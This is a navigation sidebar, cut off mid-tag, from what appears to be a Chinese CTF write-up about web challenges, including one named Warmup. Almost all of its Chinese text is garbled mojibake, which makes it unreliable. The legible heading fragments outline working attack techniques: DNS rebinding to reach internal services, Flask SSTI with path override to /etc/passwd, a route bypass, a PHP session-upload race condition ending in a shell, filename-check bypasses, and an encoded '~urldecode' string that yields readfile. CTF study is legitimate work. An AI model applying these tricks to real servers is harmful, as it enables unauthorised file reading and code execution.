UPLOAD_ERR_EXTENSIONã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#session-upload-progress-freq-å’Œ-session-upload-progress-min-freq-INIé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚-é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚"><span class="nav-number">1.1.10.</span> <span class="nav-text">session.upload_progress.freq å’Œ session.upload_progress.min_freq INIé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚ é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Example-1-æ ·ä¾‹ä¿¡æ¯"><span class="nav-number">1.1.11.</span> <span class="nav-text">Example #1 æ ·ä¾‹ä¿¡æ¯</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¸€ä¸ªä¸Šä¼ è¿›åº¦æ•°ç»„çš„ç»“æ„çš„ä¾‹å­"><span class="nav-number">1.1.12.</span> <span class="nav-text">ä¸€ä¸ªä¸Šä¼ è¿›åº¦æ•°ç»„çš„ç»“æ„çš„ä¾‹å­</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åœ¨sessionä¸­å­˜æ”¾çš„æ•°æ®çœ‹ä¸Šå»æ˜¯è¿™æ ·å­çš„ï¼š"><span class="nav-number">1.1.13.</span> <span class="nav-text">åœ¨sessionä¸­å­˜æ”¾çš„æ•°æ®çœ‹ä¸Šå»æ˜¯è¿™æ ·å­çš„ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-1"><span class="nav-number">1.1.14.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¦‚æœä½ çœ‹åˆ°è¿™ä¸ªæºç index-phpï¼Œä½ å°†ä¼šçŸ¥é“è¿™ç¬¬ä¸€æ­¥æ˜¯å»ç»•è¿‡ipé™åˆ¶ã€‚"><span class="nav-number">1.1.15.</span> <span class="nav-text">å¦‚æœä½ çœ‹åˆ°è¿™ä¸ªæºç index.phpï¼Œä½ å°†ä¼šçŸ¥é“è¿™ç¬¬ä¸€æ­¥æ˜¯å»ç»•è¿‡ipé™åˆ¶ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#äº‹å®ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„DNSé‡æ–°ç»‘å®šæ¼æ´ï¼Œå¯ä»¥ç»•è¿‡ipé™åˆ¶ã€‚"><span class="nav-number">1.1.16.</span> <span class="nav-text">äº‹å®ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„DNSé‡æ–°ç»‘å®šæ¼æ´ï¼Œå¯ä»¥ç»•è¿‡ipé™åˆ¶ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è¿™ä¸ªfile-get-contents-ä¼šå†æ¬¡æŸ¥è¯¢DNSå’Œè¯»å–å“åº”ã€‚"><span class="nav-number">1.1.17.</span> <span class="nav-text">è¿™ä¸ªfile_get_contents()ä¼šå†æ¬¡æŸ¥è¯¢DNSå’Œè¯»å–å“åº”ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¦‚æœæˆ‘ä»¬å°†åŸŸçš„Aè®°å½•è®¾ç½®ä¸º54-87-54-87å’Œ127-0-0-1ï¼Œåˆ™å¯ä»¥ç»•è¿‡IPé™åˆ¶æŸ¥è¯¢å†…éƒ¨æœåŠ¡ã€‚"><span class="nav-number">1.1.18.</span> <span class="nav-text">å¦‚æœæˆ‘ä»¬å°†åŸŸçš„Aè®°å½•è®¾ç½®ä¸º54.87.54.87å’Œ127.0.0.1ï¼Œåˆ™å¯ä»¥ç»•è¿‡IPé™åˆ¶æŸ¥è¯¢å†…éƒ¨æœåŠ¡ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¦‚æœæ²¡æœ‰ç„¶ååŸŸåå¯ä»¥ç”¨ä¸€äº›åœ¨çº¿çš„DNSé‡æ–°ç»‘å®šæœåŠ¡ï¼Œä¾‹å¦‚ï¼šrbndr-usã€‚"><span class="nav-number">1.1.19.</span> <span class="nav-text">å¦‚æœæ²¡æœ‰ç„¶ååŸŸåå¯ä»¥ç”¨ä¸€äº›åœ¨çº¿çš„DNSé‡æ–°ç»‘å®šæœåŠ¡ï¼Œä¾‹å¦‚ï¼šrbndr.usã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¾‹å¦‚36573657-7f000001-rbndr-uså°†è¿”å›54-87-54-87æˆ–127-0-0-1ã€‚"><span class="nav-number">1.1.20.</span> <span class="nav-text">ä¾‹å¦‚36573657.7f000001.rbndr.uså°†è¿”å›54.87.54.87æˆ–127.0.0.1ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-2"><span class="nav-number">1.1.21.</span> <span class="nav-text">step 2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä»dockerfileä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªç®€å•çš„flaskåº”ç”¨ç¨‹åºã€‚"><span class="nav-number">1.1.22.</span> <span class="nav-text">ä»dockerfileä¸­ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªç®€å•çš„flaskåº”ç”¨ç¨‹åºã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¹¶ä¸”åœ¨-error-pageåŠŸèƒ½ä¸Šå­˜åœ¨æ˜æ˜¾çš„SSTIæ¼æ´ï¼Œå®ƒrender-template-string-ä¸å¯æ§çš„å†…å®¹ä¸€èµ·ä½¿ç”¨ã€‚"><span class="nav-number">1.1.23.</span> <span class="nav-text">å¹¶ä¸”åœ¨/error_pageåŠŸèƒ½ä¸Šå­˜åœ¨æ˜æ˜¾çš„SSTIæ¼æ´ï¼Œå®ƒrender_template_string()ä¸å¯æ§çš„å†…å®¹ä¸€èµ·ä½¿ç”¨ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¦‚æœerror-statusè®¾ç½®ä¸ºç»å¯¹è·¯å¾„ï¼Œåˆ™è¿”å›è·¯å¾„os-path-join-å°†è¢«è¦†ç›–ã€‚"><span class="nav-number">1.1.24.</span> <span class="nav-text">å¦‚æœerror_statusè®¾ç½®ä¸ºç»å¯¹è·¯å¾„ï¼Œåˆ™è¿”å›è·¯å¾„os.path.join()å°†è¢«è¦†ç›–ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¾‹å¦‚os-path-join-quot-var-www-flask-quot-quot-error-quot-quot-etc-passwd-quot-å°†è¿”å›-etc-passwdã€‚"><span class="nav-number">1.1.25.</span> <span class="nav-text">ä¾‹å¦‚os.path.join(&quot;/var/www/flask&quot;, &quot;error&quot;, &quot;/etc/passwd&quot;)å°†è¿”å›/etc/passwdã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½†æ˜¯è¿™é‡Œçš„é—®é¢˜æ˜¯ä½ ä¸èƒ½ç›´æ¥è§¦æ‘¸å®ƒ-error-pageã€‚"><span class="nav-number">1.1.26.</span> <span class="nav-text">ä½†æ˜¯è¿™é‡Œçš„é—®é¢˜æ˜¯ä½ ä¸èƒ½ç›´æ¥è§¦æ‘¸å®ƒ/error_pageã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç”±äºå‰é¢çš„phpå°†æ£€æŸ¥æŸ¥è¯¢çš„è·¯å¾„ï¼Œå› æ­¤è¯¥è·¯å¾„å¿…é¡»åŒ…å«å­—ç¬¦ä¸²korea"><span class="nav-number">1.1.27.</span> <span class="nav-text">ç”±äºå‰é¢çš„phpå°†æ£€æŸ¥æŸ¥è¯¢çš„è·¯å¾„ï¼Œå› æ­¤è¯¥è·¯å¾„å¿…é¡»åŒ…å«å­—ç¬¦ä¸²korea:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æ­¤è·¯å¾„çš„é™åˆ¶ï¼š"><span class="nav-number">1.1.28.</span> <span class="nav-text">æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡æ­¤è·¯å¾„çš„é™åˆ¶ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ–¹æ³•0x1"><span class="nav-number">1.1.29.</span> <span class="nav-text">æ–¹æ³•0x1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½ å¯ä»¥ä½¿ç”¨é‡å®šå‘ï¼š"><span class="nav-number">1.1.30.</span> <span class="nav-text">ä½ å¯ä»¥ä½¿ç”¨é‡å®šå‘ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½¿ç”¨DNSé‡æ–°ç»‘å®šåˆ°æœåŠ¡å™¨IPï¼Œç„¶åè®¾ç½®-koreaè¦é‡å®šå‘åˆ°çš„è·¯å¾„127-0-0-1-5000-error-page-err-ã€‚"><span class="nav-number">1.1.31.</span> <span class="nav-text">ä½¿ç”¨DNSé‡æ–°ç»‘å®šåˆ°æœåŠ¡å™¨IPï¼Œç„¶åè®¾ç½®/koreaè¦é‡å®šå‘åˆ°çš„è·¯å¾„127.0.0.1:5000/error_page?=err......ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åŸå› æ˜¯file-get-contents-å°†éµå¾ª302é‡å®šå‘ã€‚"><span class="nav-number">1.1.32.</span> <span class="nav-text">åŸå› æ˜¯file_get_contents()å°†éµå¾ª302é‡å®šå‘ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ–¹æ³•0x2"><span class="nav-number">1.1.33.</span> <span class="nav-text">æ–¹æ³•0x2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½¿ç”¨Flaskçš„ç‰¹æ®ŠåŠŸèƒ½ï¼"><span class="nav-number">1.1.34.</span> <span class="nav-text">ä½¿ç”¨Flaskçš„ç‰¹æ®ŠåŠŸèƒ½ï¼</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åœ¨flaskåº”ç”¨ç¨‹åºä¸­ï¼Œ-korea-pingç­‰äº-ping"><span class="nav-number">1.1.35.</span> <span class="nav-text">åœ¨flaskåº”ç”¨ç¨‹åºä¸­ï¼Œ//korea/pingç­‰äº/ping</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨-korea-error-page-err-ç»•è¿‡é™åˆ¶ã€‚"><span class="nav-number">1.1.36.</span> <span class="nav-text">å› æ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨//korea/error_page?err=...ç»•è¿‡é™åˆ¶ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-3"><span class="nav-number">1.1.37.</span> <span class="nav-text">step 3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶render-template-string-è¯»å–å†…å®¹çš„è·¯å¾„ã€‚"><span class="nav-number">1.1.38.</span> <span class="nav-text">ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶render_template_string()è¯»å–å†…å®¹çš„è·¯å¾„ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½ åº”è¯¥å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ”¾ç½®æˆ‘ä»¬å¯æ§æœ‰æ•ˆè´Ÿè½½çš„æ–‡ä»¶ã€‚"><span class="nav-number">1.1.39.</span> <span class="nav-text">ä½ åº”è¯¥å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥æ”¾ç½®æˆ‘ä»¬å¯æ§æœ‰æ•ˆè´Ÿè½½çš„æ–‡ä»¶ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç”±äºæœåŠ¡å™¨ä½¿ç”¨phpè¿è¡Œï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥session-upload-progressæ–¹æ³•å°†SSTIæœ‰æ•ˆè´Ÿè½½ä¸Šä¼ åˆ°ä¼šè¯æ–‡ä»¶ã€‚"><span class="nav-number">1.1.40.</span> <span class="nav-text">ç”±äºæœåŠ¡å™¨ä½¿ç”¨phpè¿è¡Œï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥session.upload_progressæ–¹æ³•å°†SSTIæœ‰æ•ˆè´Ÿè½½ä¸Šä¼ åˆ°ä¼šè¯æ–‡ä»¶ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¦‚æœPHP-SESSION-UPLOAD-PROGRESSåœ¨å¤šéƒ¨åˆ†POSTæ•°æ®ä¸­æä¾›ï¼ŒPHPå°†ä¸ºæ‚¨å¯ç”¨ä¼šè¯ã€‚"><span class="nav-number">1.1.41.</span> <span class="nav-text">å¦‚æœPHP_SESSION_UPLOAD_PROGRESSåœ¨å¤šéƒ¨åˆ†POSTæ•°æ®ä¸­æä¾›ï¼ŒPHPå°†ä¸ºæ‚¨å¯ç”¨ä¼šè¯ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-4"><span class="nav-number">1.1.42.</span> <span class="nav-text">step 4</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#é»˜è®¤session-upload-progress-cleanupè®¾ç½®ä¸ºOnï¼Œå› æ­¤æ‚¨çš„SSTIæœ‰æ•ˆè´Ÿè½½å°†è¢«å¿«é€Ÿæ¸…é™¤ã€‚"><span class="nav-number">1.1.43.</span> <span class="nav-text">é»˜è®¤session.upload_progress.cleanupè®¾ç½®ä¸ºOnï¼Œå› æ­¤æ‚¨çš„SSTIæœ‰æ•ˆè´Ÿè½½å°†è¢«å¿«é€Ÿæ¸…é™¤ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ç»•è¿‡ã€‚"><span class="nav-number">1.1.44.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ç»•è¿‡ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åˆ©ç”¨è„šæœ¬ï¼š"><span class="nav-number">1.1.45.</span> <span class="nav-text">åˆ©ç”¨è„šæœ¬ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æœ€ågetshellæˆåŠŸã€‚"><span class="nav-number">1.1.46.</span> <span class="nav-text">æœ€ågetshellæˆåŠŸã€‚</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-Warmup"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 Warmup</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#é¢˜ç›®æè¿°-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">é¢˜ç›®æè¿°</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Baby-PHP-challenge-again"><span class="nav-number">1.2.2.</span> <span class="nav-text">Baby PHP challenge again.</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æºç "><span class="nav-number">1.2.3.</span> <span class="nav-text">æºç </span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°è®¸å¤šçš„phpåŸç†å’Œå¤è€çš„php-windowsæŠ€å·§ã€‚"><span class="nav-number">1.2.4.</span> <span class="nav-text">è¿™ä¸ªé¢˜ç›®æ¶‰åŠåˆ°è®¸å¤šçš„phpåŸç†å’Œå¤è€çš„php/windowsæŠ€å·§ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-1-1"><span class="nav-number">1.2.5.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åˆšå¼€å§‹æ‹¿åˆ°æºç å‘ç°éå¸¸çš„éš¾è¯»ï¼Œæˆ‘ä»¬éœ€è¦é‡æ„ä¸€ä¸‹ã€‚"><span class="nav-number">1.2.6.</span> <span class="nav-text">åˆšå¼€å§‹æ‹¿åˆ°æºç å‘ç°éå¸¸çš„éš¾è¯»ï¼Œæˆ‘ä»¬éœ€è¦é‡æ„ä¸€ä¸‹ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¸‹é¢æ˜¯é‡æ„åçš„æºç ï¼š"><span class="nav-number">1.2.7.</span> <span class="nav-text">ä¸‹é¢æ˜¯é‡æ„åçš„æºç ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#step-2-1"><span class="nav-number">1.2.8.</span> <span class="nav-text">step 2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æˆ‘ä»¬ç°åœ¨åˆå§‹å»è¯»å–config-php"><span class="nav-number">1.2.9.</span> <span class="nav-text">æˆ‘ä»¬ç°åœ¨åˆå§‹å»è¯»å–config.php</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æœ‰ä¸¤ä¸ªæ–¹å¼å¯ä»¥å»ç”¨ï¼š"><span class="nav-number">1.2.10.</span> <span class="nav-text">æœ‰ä¸¤ä¸ªæ–¹å¼å¯ä»¥å»ç”¨ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-ä½¿ç”¨file-get-contents-é¢„æœŸ"><span class="nav-number">1.2.11.</span> <span class="nav-text">1.ä½¿ç”¨file_get_contents()(é¢„æœŸ)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-ä½¿ç”¨eval-éé¢„æœŸ"><span class="nav-number">1.2.12.</span> <span class="nav-text">2.ä½¿ç”¨eval()(éé¢„æœŸ)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ–¹æ³•-0x1"><span class="nav-number">1.2.13.</span> <span class="nav-text">æ–¹æ³• 0x1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#if-stRLEn-op-lt-4-amp-amp-op-78-lt-39-A-A-39"><span class="nav-number">1.2.14.</span> <span class="nav-text">if(@stRLEn($op) &lt; 4 &amp;&amp; @($op + 78) &lt; &#39;A__A&#39;)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥ç”¨op-99æ¥ç»•è¿‡ã€‚"><span class="nav-number">1.2.15.</span> <span class="nav-text">å¯¹äºè¿™æ®µä»£ç æˆ‘ä»¬å¯ä»¥ç”¨op=-99æ¥ç»•è¿‡ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¹‹åæˆ‘ä»¬å¯ä»¥è¾“å…¥æˆ‘ä»¬çš„æ–‡ä»¶ååˆ°file-get-contents"><span class="nav-number">1.2.16.</span> <span class="nav-text">ä¹‹åæˆ‘ä»¬å¯ä»¥è¾“å…¥æˆ‘ä»¬çš„æ–‡ä»¶ååˆ°file_get_contents():</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GET-39-39"><span class="nav-number">1.2.17.</span> <span class="nav-text">$_GET[&#39;&#39;];</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è¿™ä¸ªå‚æ•°-GETçš„å‚æ•°æ˜¯-xE2-x81-xA3ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚"><span class="nav-number">1.2.18.</span> <span class="nav-text">è¿™ä¸ªå‚æ•°$_GETçš„å‚æ•°æ˜¯\xE2\x81\xA3ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æˆ‘ä»¬çš„ç›®çš„æ˜¯å»é˜…è¯»config-phpï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›æ–‡ä»¶åæœ‰æ£€æŸ¥ã€‚"><span class="nav-number">1.2.19.</span> <span class="nav-text">æˆ‘ä»¬çš„ç›®çš„æ˜¯å»é˜…è¯»config.phpï¼Œä½†æ˜¯å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸€äº›æ–‡ä»¶åæœ‰æ£€æŸ¥ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨-phpï¼Œphp-çš„æ–‡ä»¶ååç¼€å¹¶ä¸”æˆ‘ä»¬çš„æ–‡ä»¶åä¸èƒ½åŒ…å«-quot-gt-lt-amp-ã€‚"><span class="nav-number">1.2.20.</span> <span class="nav-text">æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨.phpï¼Œphp.çš„æ–‡ä»¶ååç¼€å¹¶ä¸”æˆ‘ä»¬çš„æ–‡ä»¶åä¸èƒ½åŒ…å«&quot;,&gt;,&lt;,amp,$,..ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¸ºäº†å»ç»•è¿‡è¿™ä¸ªé™åˆ¶å»é˜…è¯»phpæºä»£ç ï¼Œä½ ä»…ä»…éœ€è¦å»æ·»åŠ ä¸€ä¸ªç©ºæ ¼-20-ï¼š"><span class="nav-number">1.2.21.</span> <span class="nav-text">ä¸ºäº†å»ç»•è¿‡è¿™ä¸ªé™åˆ¶å»é˜…è¯»phpæºä»£ç ï¼Œä½ ä»…ä»…éœ€è¦å»æ·»åŠ ä¸€ä¸ªç©ºæ ¼(%20)ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#config-php-SPACE"><span class="nav-number">1.2.22.</span> <span class="nav-text">config.php[SPACE]</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Because-the-server-is-running-on-Windows-there-are-some-weird-path-normalization-rule-here-p"><span class="nav-number">1.2.23.</span> <span class="nav-text">(Because the server is running on Windows, there are some weird path normalization rule here :p)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½ å¦‚æœå°è¯•å»è¯»å–æºä»£ç config-phpä½¿ç”¨å¦‚ä¸‹payload"><span class="nav-number">1.2.24.</span> <span class="nav-text">ä½ å¦‚æœå°è¯•å»è¯»å–æºä»£ç config.phpä½¿ç”¨å¦‚ä¸‹payload:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½ å°†ä¼šå¾—åˆ°config-phpçš„å†…å®¹ã€‚"><span class="nav-number">1.2.25.</span> <span class="nav-text">ä½ å°†ä¼šå¾—åˆ°config.phpçš„å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å› ä¸ºfile-get-contents-çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯155ã€‚"><span class="nav-number">1.2.26.</span> <span class="nav-text">å› ä¸ºfile_get_contents()çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯155ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æˆ‘ä»¬åº”è¯¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„phpåŒ…è£…å™¨æ¥è§£å‹ç¼©config-phpçš„å†…å®¹ã€‚"><span class="nav-number">1.2.27.</span> <span class="nav-text">æˆ‘ä»¬åº”è¯¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„phpåŒ…è£…å™¨æ¥è§£å‹ç¼©config.phpçš„å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å› æ­¤php-filter-zlib-deflateæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚"><span class="nav-number">1.2.28.</span> <span class="nav-text">å› æ­¤php://filter/zlib.deflateæ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½¿ç”¨zlib-deflateå‹ç¼©å†…å®¹ï¼Œç„¶åä½¿ç”¨zlib-inflateè§£å‹ç¼©å†…å®¹ã€‚"><span class="nav-number">1.2.29.</span> <span class="nav-text">ä½¿ç”¨zlib.deflateå‹ç¼©å†…å®¹ï¼Œç„¶åä½¿ç”¨zlib.inflateè§£å‹ç¼©å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#è„šæœ¬å¦‚ä¸‹ï¼š"><span class="nav-number">1.2.30.</span> <span class="nav-text">è„šæœ¬å¦‚ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½ å°†ä¼šçœ‹è§config-phpçš„å†…å®¹ã€‚"><span class="nav-number">1.2.31.</span> <span class="nav-text">ä½ å°†ä¼šçœ‹è§config.phpçš„å†…å®¹ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ–¹æ³•-0x2"><span class="nav-number">1.2.32.</span> <span class="nav-text">æ–¹æ³• 0x2</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨eval-æ¥è¯»å–config-phpã€‚"><span class="nav-number">1.2.33.</span> <span class="nav-text">æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨eval()æ¥è¯»å–config.phpã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åœ¨è¿™ä¸ªeval-å‡½æ•°ä¸­ï¼Œä½ è¾“å…¥çš„-å°†ä¼šæ”¾åˆ°eval-quot-return-quot-ã€‚"><span class="nav-number">1.2.34.</span> <span class="nav-text">åœ¨è¿™ä¸ªeval()å‡½æ•°ä¸­ï¼Œä½ è¾“å…¥çš„$_å°†ä¼šæ”¾åˆ°eval(&quot;return $_;&quot;)ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä½†æ˜¯æœ‰ä¸ªä¸¥æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ§åˆ¶ï¼š"><span class="nav-number">1.2.35.</span> <span class="nav-text">ä½†æ˜¯æœ‰ä¸ªä¸¥æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ§åˆ¶ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç„¶è€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨-æ¥ç»•è¿‡è®¸å¤šçš„é™åˆ¶ã€‚"><span class="nav-number">1.2.36.</span> <span class="nav-text">ç„¶è€Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨~æ¥ç»•è¿‡è®¸å¤šçš„é™åˆ¶ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¾‹å¦‚ï¼š-urldecode-quot-8D-9A-9E-9B-99-96-93-9A-quot-ç­‰ä»·äºreadfile"><span class="nav-number">1.2.37.</span> <span class="nav-text">ä¾‹å¦‚ï¼š~urldecode(&quot;%8D%9A%9E%9B%99%96%93%9A&quot;)ç­‰ä»·äºreadfile</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#åœ¨windowsä¸­ï¼Œæœ‰ä¸€äº›MAGICé€šé…ç¬¦åŠŸèƒ½å¯ç”¨äºè·¯å¾„æ ‡å‡†åŒ–ã€‚"><span class="nav-number">1.2.38.</span> <span class="nav-text">åœ¨windowsä¸­ï¼Œæœ‰ä¸€äº›MAGICé€šé…ç¬¦åŠŸèƒ½å¯ç”¨äºè·¯å¾„æ ‡å‡†åŒ–ã€‚</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¾‹å¦‚ï¼š"><span class="nav-number">1.2.39.</span> <span class="nav-text">ä¾‹å¦‚ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gt-å°†åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ã€‚-ä¾‹å¦‚-åœ¨linuxä¸­"><span class="nav-number">1.2.40.</span> <span class="nav-text">&gt;å°†åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ã€‚(ä¾‹å¦‚?åœ¨linuxä¸­)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-å°†åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªä»»æ„å­—ç¬¦ã€‚-ä¾‹å¦‚-åœ¨linuxä¸­"><span class="nav-number">1.2.41.</span> <span class="nav-text">&lt;å°†åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªä»»æ„å­—ç¬¦ã€‚(ä¾‹å¦‚*åœ¨linuxä¸­)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ç»“åˆ-æŠ€å·§å’Œ-lt-æŠ€å·§ï¼š"><span class="nav-number">1.2.42.</span> <span class="nav-text">ç»“åˆ~æŠ€å·§å’Œ&lt;æŠ€å·§ï¼š</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ä¸readfile-quot-co-lt-lt-quot-ç›¸åŒ"><span class="nav-number">1.2.43.</span> <span 